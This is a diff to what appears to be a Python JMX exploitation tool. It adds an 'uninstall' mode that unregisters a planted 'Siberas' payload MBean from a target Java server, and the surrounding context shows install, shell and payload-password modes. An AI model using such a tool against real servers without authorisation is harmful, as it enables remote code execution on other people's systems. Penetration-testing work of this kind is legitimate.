@@ -138,6 +138,22 @@ def MakeHandlerClass(base_url):
 ### /INSTALL MODE ###
 
 
+### UNINSTALL MODE ###
+def uninstallMode(args):
+    bean_server = connectToJMX(args)
+    uninstallMBeans(bean_server)
+
+def uninstallMBeans(bean_server):
+    try:
+        bean_server.unregisterMBean(ObjectName("Siberas:name=payload,id=1"))
+    except:
+        print "[-] Error: The MBean is not registered in the target server"
+        sys.exit(0)
+    print "[+] MBean correctly uninstalled"
+
+### /UNINSTALL MODE ###
+
+
 ### CHANGE PASSWORD MODE ###
 
 def changePasswordMode(args):
@@ -280,6 +296,10 @@ def arg_shell_mode(args):
 def arg_password_mode(args):
     print authorSignature
     changePasswordMode(args)
+def arg_uninstall_mode(args):
+    print authorSignature
+    uninstallMode(args)
+
 
 
 # Base parser
@@ -294,6 +314,10 @@ install_subparser = subparsers.add_parser('install', help='install the payload M
 install_subparser.add_argument('payload_url', help='URL to load the payload (full URL)')
 install_subparser.add_argument('payload_port', help='port to load the payload')
 install_subparser.set_defaults(func=arg_install_mode)
+
+# Uninstall mode
+uninstall_subparser = subparsers.add_parser('uninstall', help='uninstall the payload MBean from the target')
+uninstall_subparser.set_defaults(func=arg_uninstall_mode)
 
 # Password mode
 install_subparser = subparsers.add_parser('password', help='change the payload password on the target')
